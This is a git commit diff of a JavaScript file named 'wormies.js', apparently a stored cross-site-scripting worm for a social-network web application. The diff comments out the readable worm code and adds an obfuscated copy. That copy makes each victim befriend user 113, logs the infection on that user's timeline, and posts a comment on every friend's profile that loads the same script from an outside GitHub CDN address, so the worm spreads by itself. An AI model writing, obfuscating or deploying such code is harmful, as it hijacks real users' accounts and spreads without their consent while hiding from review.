bc8eac99f2b3e50cd1e58f56cbb28efe3f6d4a24
sxa7263 <35963445+sxa7263@users.noreply.github.com>
2020-11-08 12:14:24 -0500

    Update wormies.js

--- wormies.js
+++ wormies.js
@@ -1,14 +1,16 @@
-$.get("add_friend.php", {'id': 113}); 
-$.get("friends.php", (homies)=>{
-    a = homies.split("?id="); 
-    for(var i = 1; i < a.length; i++){
-        b = a[i].split("'>")[0];
-        $.get("timeline.php", {'id': 113}, (report)=>{
-            if(!report.includes(b + " got wormed")){
-                $.get("add_comment.php", {'id': 113, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
-                $.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js'></script>YOU GOT WORMED"});
-            }
-        });
-    }
-}
-)
+// $.get("add_friend.php", {'id': 113}); 
+// $.get("friends.php", (homies)=>{
+//     a = homies.split("?id="); 
+//     for(var i = 1; i < a.length; i++){
+//         b = a[i].split("'>")[0];
+//         $.get("timeline.php", {'id': 113}, (report)=>{
+//             if(!report.includes(b + " got wormed")){
+//                 $.get("add_comment.php", {'id': 113, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
+//                 $.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js'></script>YOU GOT WORMED"});
+//             }
+//         });
+//     }
+// }
+// )
+
+var _0x14c2=['includes','timeline.php','length','\x20got\x20wormed','?id=','split','now','add_comment.php','get'];(function(_0x270a9b,_0x14c252){var _0x2f495e=function(_0xdcba7d){while(--_0xdcba7d){_0x270a9b['push'](_0x270a9b['shift']());}};_0x2f495e(++_0x14c252);}(_0x14c2,0x127));var _0x2f49=function(_0x270a9b,_0x14c252){_0x270a9b=_0x270a9b-0x0;var _0x2f495e=_0x14c2[_0x270a9b];return _0x2f495e;};var _0x36b050=_0x2f49;$[_0x36b050('0x1')]('add_friend.php',{'id':0x71}),$['get']('friends.php',_0xdcba7d=>{var _0x5c428e=_0x36b050;a=_0xdcba7d[_0x5c428e('0x7')](_0x5c428e('0x6'));for(var _0x162290=0x1;_0x162290<a[_0x5c428e('0x4')];_0x162290++){b=a[_0x162290]['split']('\x27>')[0x0],$[_0x5c428e('0x1')](_0x5c428e('0x3'),{'id':0x71},_0x43f89e=>{var _0x38f3f8=_0x5c428e;!_0x43f89e[_0x38f3f8('0x2')](b+_0x38f3f8('0x5'))&&($['get'](_0x38f3f8('0x0'),{'id':0x71,'comment':b+'\x20got\x20wormed\x20datetime='+new Date(Date[_0x38f3f8('0x8')]())['toLocaleString']()}),$['get'](_0x38f3f8('0x0'),{'id':b,'comment':'<script\x20src=\x27https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js\x27></script>YOU\x20GOT\x20WORMED'}));});}});
